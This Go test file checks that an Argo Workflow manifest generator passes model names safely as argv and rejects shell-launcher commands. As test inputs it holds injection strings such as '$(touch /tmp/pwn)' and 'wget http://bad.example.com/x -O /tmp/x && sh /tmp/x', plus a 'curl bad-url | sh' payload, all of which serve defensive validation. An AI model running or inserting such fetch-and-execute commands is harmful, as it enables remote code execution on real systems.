package argo

import (
	"strings"
	"testing"
)

func TestGenerateWorkflowYOLOv11(t *testing.T) {
	manifest, summary, err := GenerateWorkflow(WorkflowRequest{
		Name:      "train-yolov11",
		Namespace: "ml",
		Task:      "train",
		Model:     "yolov11",
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"apiVersion: argoproj.io/v1alpha1",
		"kind: Workflow",
		"name: train-yolov11",
		"namespace: ml",
		"ultralytics/ultralytics:latest",
		"model=yolo11n.pt",
	} {
		if !strings.Contains(manifest, want) {
			t.Fatalf("manifest missing %q:\n%s", want, manifest)
		}
	}
	if !strings.Contains(summary, "train-yolov11") {
		t.Fatalf("summary=%q", summary)
	}
}

func TestInferModelFromPrompt(t *testing.T) {
	if got := InferModelFromPrompt("train a yolov11 model"); got != "yolov11" {
		t.Fatalf("got=%q", got)
	}
}

func TestGenerateWorkflowRequiresImageOrModel(t *testing.T) {
	_, _, err := GenerateWorkflow(WorkflowRequest{Name: "demo"})
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
	manifest, _, err := GenerateWorkflow(WorkflowRequest{
		Name:  "train-custom",
		Model: "custom-model-1",
	})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, " -c") {
		t.Fatalf("manifest should avoid shell launcher:\n%s", manifest)
	}
	if !strings.Contains(manifest, "command:") || !strings.Contains(manifest, "- echo") {
		t.Fatalf("manifest=%s", manifest)
	}
}

// TestGenerateWorkflowInjectionShapedModelIsArgvSafe covers acceptance criterion 2 of SEC-006:
// injection-shaped model strings must be passed as literal argv args, never evaluated by a shell.
func TestGenerateWorkflowInjectionShapedModelIsArgvSafe(t *testing.T) {
	maliciousModels := []string{
		"$(touch /tmp/pwn)",
		"`id`",
		"model; curl bad-url | sh",
		"model && wget http://bad.example.com/x -O /tmp/x && sh /tmp/x",
	}
	for _, model := range maliciousModels {
		manifest, _, err := GenerateWorkflow(WorkflowRequest{
			Name:  "train-custom",
			Model: model,
		})
		if err != nil {
			t.Fatalf("model=%q: unexpected error: %v", model, err)
		}
		// Must use echo (argv-safe), never sh/bash/shell launcher
		if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, "bash -c") {
			t.Fatalf("model=%q: manifest uses shell launcher:\n%s", model, manifest)
		}
		if !strings.Contains(manifest, "- echo") {
			t.Fatalf("model=%q: manifest missing expected echo command:\n%s", model, manifest)
		}
	}
}

const shellPayload = "curl bad-url | sh"

// TestGenerateWorkflowRejectsShellLauncher covers every way a shell launcher can
// be spread across command and args, including interleaved flags that a
// fixed-position check misses.
func TestGenerateWorkflowRejectsShellLauncher(t *testing.T) {
	cases := []struct {
		name    string
		command []string
		args    []string
	}{
		{"command holds flag", []string{"/bin/sh", "-c"}, []string{shellPayload}},
		{"args hold flag", []string{"/bin/sh"}, []string{"-c", shellPayload}},
		{"bash split", []string{"bash"}, []string{"-c", shellPayload}},
		{"interactive flag before split", []string{"/bin/sh", "-i"}, []string{"-c", shellPayload}},
		{"interactive flag inside args", []string{"bash"}, []string{"-i", "-c", shellPayload}},
		{"trace flag before split", []string{"/bin/sh", "-x"}, []string{"-c", shellPayload}},
		{"entirely in command", []string{"/bin/sh", "-i", "-c", shellPayload}, nil},
		{"entirely in args", nil, []string{"/bin/sh", "-c", shellPayload}},
		{"absolute usr path", []string{"/usr/bin/bash"}, []string{"-c", shellPayload}},
		{"dash", []string{"dash"}, []string{"-c", shellPayload}},
		{"ash", []string{"ash"}, []string{"-c", shellPayload}},
		{"ksh", []string{"ksh"}, []string{"-c", shellPayload}},
		{"busybox", []string{"busybox"}, []string{"sh", "-c", shellPayload}},
		{"zsh", []string{"zsh"}, []string{"-c", shellPayload}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, _, err := GenerateWorkflow(WorkflowRequest{
				Name:    "train",
				Image:   "python:3.11-slim",
				Command: tc.command,
				Args:    tc.args,
			})
			if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
				t.Fatalf("command=%v args=%v: err=%v", tc.command, tc.args, err)
			}
		})
	}
}

// TestGenerateWorkflowRejectsClusteredShellFlags checks flag clusters that still
// make the shell evaluate the next argument as a command string.
func TestGenerateWorkflowRejectsClusteredShellFlags(t *testing.T) {
	for _, flag := range []string{"-lc", "-ec", "-elc", "-xc"} {
		shapes := []struct {
			command []string
			args    []string
		}{
			{[]string{"/bin/sh"}, []string{flag, shellPayload}},
			{[]string{"zsh", flag}, []string{shellPayload}},
			{[]string{"bash", "-i"}, []string{flag, shellPayload}},
		}
		for _, shape := range shapes {
			_, _, err := GenerateWorkflow(WorkflowRequest{
				Name:    "train",
				Image:   "python:3.11-slim",
				Command: shape.command,
				Args:    shape.args,
			})
			if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
				t.Fatalf("command=%v args=%v: err=%v", shape.command, shape.args, err)
			}
		}
	}
}

// TestGenerateWorkflowAllowsNonShellEntrypoints guards the widened scan against
// rejecting legitimate entrypoints that merely carry a -c flag of their own.
func TestGenerateWorkflowAllowsNonShellEntrypoints(t *testing.T) {
	cases := []struct {
		name    string
		command []string
		args    []string
	}{
		{"python with own -c flag", []string{"python"}, []string{"train.py", "-c", "config.yaml"}},
		{"shell running a script", []string{"/bin/sh"}, []string{"/app/run.sh"}},
		{"shell with long flag only", []string{"bash"}, []string{"--login", "/app/run.sh"}},
		{"no command or args", nil, nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, _, err := GenerateWorkflow(WorkflowRequest{
				Name:    "train",
				Image:   "python:3.11-slim",
				Command: tc.command,
				Args:    tc.args,
			})
			if err != nil {
				t.Fatalf("command=%v args=%v: unexpected error: %v", tc.command, tc.args, err)
			}
		})
	}
}
